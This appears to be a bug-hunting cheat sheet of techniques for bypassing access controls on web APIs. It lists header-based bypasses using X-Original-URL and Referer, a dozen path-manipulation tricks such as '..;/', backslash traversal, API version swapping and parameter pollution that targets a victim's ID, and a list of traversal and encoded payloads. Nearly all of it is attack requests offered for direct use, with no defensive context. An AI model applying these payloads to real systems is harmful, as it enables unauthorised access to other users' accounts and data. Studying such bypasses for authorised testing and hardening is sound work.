# Web-Hacking #
## Topics 

#### Tricks
<b>If you want do bypass endpoint always try to use own methodology.</b>

<b>Example</b>:

Http Header based bypass:

<b>1.</b> X-Original-URL: /redact

<b>Example:</b><br/>
 
GET /api/getUser HTTP/1.1 → 403
Host: redact.com

GET / HTTP/1.1
Host: redact.com
X-Original-URL: /api/getUser → 200 OK

<b>2.</b> Referer: https://site.com/api/redact

Example:<br/>
  

GET /api/getUser HTTP/1.1 → acess denied
Host: redact.com

  
  
GET / HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser → 200 OK
 
  or
  
GET / HTTP/1.1
Host: redact.com
Referer: https://site.com/api/getUser → 200 ok

More examples:

<b>3</b>. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid.json → bypass ok

<b>4</b>. https://site.com/api/v1/redactid → acess denied
https://site.com/api/v1/users/redactid: → bypass ok

<b>5</b>. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid..;/ → bypass ok

<b>6</b>. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid\..\.\getUser → bypass ok

<b>7</b>. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid/ → bypass ok

<b>8</b>. https://site.com/api/v1/users/redactid → acess denied
https://site.com/api/v1/users/redactid?? → bypass ok

<b>9</b>. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v2/users/redactid → bypass ok
            or
https://site.com/api/v3/users/redactid → bypass ok

<b>10</b>. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid&accountdetails → bypass ok

<b>11</b>. https://site.com/api/v1/users/victim?id=BAEILsaqQhk → acess denied
https://site.com/api/v1/users/your?id=UAEILsdUf50&victim?id=BAEILsaqQhk → bypass ok

<b>12</b>. https://site.com/api/v1/users/redactid → access denied
https://site.com/api/v1/users/redactid/email → bypass ok

Payload for basic test:

? <br/>
?? <br/>
& <br/>
# <br/>
% <br/>
%20 <br/>
%09 <br/>
/ <br/>
/..;/ <br/>
../ <br/>
..$2f <br/>
..;/ <br/>
../ <br/>
\..\.\ <br/>
.././ <br/>
..%00/ <br/>
.%0d/ <br/>
..%5c <br/>
..\ <br/>
..%ff/ <br/>
%2e%2e%2f <br/>
.%2e/ <br/>
%3f <br/>
%26 <br/>
%23 <br/>
.json <br/>

HTTP Header based bypass:

1. X-Original-URL: /redact
2. Referer: https://site.com/api/redact



